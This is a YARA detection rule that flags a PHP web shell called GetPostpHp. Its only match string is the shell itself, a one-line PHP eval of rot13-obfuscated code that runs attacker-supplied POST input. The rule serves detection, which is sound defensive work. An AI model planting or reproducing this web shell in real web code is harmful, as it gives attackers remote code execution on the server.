rule webshell_GetPostpHp
{
	meta:
		description = "Web shells - generated from file GetPostpHp.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/03/28"
		score = 70
		hash = "20ede5b8182d952728d594e6f2bb5c76"
		os = "windows,linux,macos,ios,android"
		filetype = "script"

	strings:
		$s0 = "<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>" fullword

	condition:
		all of them
}
